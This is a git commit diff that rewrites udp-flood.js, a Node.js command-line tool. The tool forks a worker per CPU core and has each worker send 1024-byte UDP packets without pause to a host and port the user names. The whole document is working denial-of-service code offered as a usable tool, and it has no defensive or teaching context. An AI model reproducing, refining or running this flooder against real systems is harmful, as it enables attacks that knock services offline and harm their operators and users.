99382c9a5b71cae7ef8e85560a75cc6783971446
GloriousYellow <yellowglorious@gmail.com>
2017-10-07 14:34:49 -0400

    Significant improvements

--- udp-flood.js
+++ udp-flood.js
@@ -1,98 +1,70 @@
 #!/usr/bin/env node
 
-var dgram = require("dgram"),
-    Commander  = require('commander'),
-    cluster = require('cluster'),
-    os = require('os'),
-    idleGC = require('idle-gc'),
-    q = require('q');
+const dgram = require('dgram')
+const Commander = require('commander')
+const cluster = require('cluster')
+const os = require('os')
+const log = require('fancy-log')
 
-var commander = Commander
+const setBlocking = require('set-blocking')
+
+setBlocking(true)
+
+const commander = Commander
   .option('-h, --host <host>', 'Host Name/IP.', String)
   .option('-w, --workers <workers>', 'Number of workers to fork in the cluster, default is CPU count.', parseInt)
   .option('-p, --port <port>', 'If not defined, program will use random ports.', parseInt)
   .option('-d, --delay <delay>', 'Delay in ms between packet sending (per worker). Defaults to 0.', parseInt)
-  .option('-t, --data <data>', 'Optional data to send. Default (ICMP ping packet) is used if not specified.', String)
-  .option('-s, --silent', 'Silences printing the sent packet count on each cluster.')
-  .parse(process.argv);
-  
-require('./q-flow');
+  .parse(process.argv)
 
-var port = commander.port || Math.floor(Math.random() * (65553) + 1);
-var workers = commander.workers || os.cpus().length + 1;
+const port = commander.port || 55555
+const workers = commander.workers || os.cpus().length + 1
 
-var client = dgram.createSocket({type:'udp4',reuseAddr:true});
+const client = dgram.createSocket({ type: 'udp4', reuseAddr: true })
 
-client.on("error", function (err) {
-  console.error("UDP error:\n" + err.stack);
-  client.close();
-  process.exit(1);
-});
+client.on('error', (err) => {
+  log(`UDP error: \n${err.stack}`)
+  client.close()
+  process.exit(1)
+})
 
-client.bind(port);
+client.bind(port)
 
+function sendOne(ip, fport) {
+  return new Promise((resolve, reject) => {
+    const msg = Buffer.alloc(1024)
+    client.send(msg, 0, msg.length, fport, ip, err => (err ? reject(err) : resolve(false)))
+  })
+}
 
-
-function sendOne(ip, port){
-  return new Promise(function(resolve, reject){
-    
-    var msg = new Buffer ([]);
-
-    if(commander.data){
-      // custom msg
-      msg = new Buffer(commander.data);
-
-    }else{
-      // ICMP ping packet.
-      msg = Buffer.alloc(1024);
+function until(fn) {
+  return fn().then((result) => {
+    if (result) {
+      return result
     }
-        
-    client.send(msg, 0, msg.length, port, ip, function(err){
-      return err ? reject(err) : resolve();
-    });
-
-  });
+    return until(fn)
+  })
 }
 
-function runWorker(){
-  idleGC.start(5000);
-  var packetsSent = 0;
-  console.log('Flooding', commander.host, 'with UDP packets on port', port);
-  // Small timeout to read the msg above before packet counts print to console.
-  setTimeout(function(){
-    q.until(function() {
-      return q.delay(commander.delay || 0)
-      .then(function(){
-        return sendOne(commander.host, port);
-      })
-      .then(function() {
-        packetsSent++;
-        if(!commander.silent){ 
-          if(commander.data){
-            console.log('custom packets sent', packetsSent);
-          }else{
-            console.log('packets sent', packetsSent);
-          }
-        }
-        return false;
-      });
-    }).done(function() {
-      return console.log('done');
-    });
-  }, 3000);
+function runWorker() {
+  until(
+    () => sendOne(commander.host, port),
+  )
 }
-if(!commander.host) return console.log('No host specified. Exiting.');
 
-if(cluster.isMaster){
-  for (var i = 0; i < workers; i++) {
-    console.log('Started worker', i + 1);
-    cluster.fork();
+if (!commander.host) {
+  log('No host specified. Exiting.')
+  process.exit()
+}
+
+if (cluster.isMaster) {
+  for (let i = 0; i < workers; i += 1) {
+    log('Started worker', i + 1)
+    cluster.fork()
   }
-  
-  cluster.on('exit', function(worker, code, signal) {
-    console.log('Worker ' + worker.process.pid + ' died');
-  });
-  
-}else{
-  runWorker();
+  cluster.on('exit', (worker) => {
+    log(`Worker ${worker.process.pid} died`)
+  })
+} else {
+  runWorker()
 }
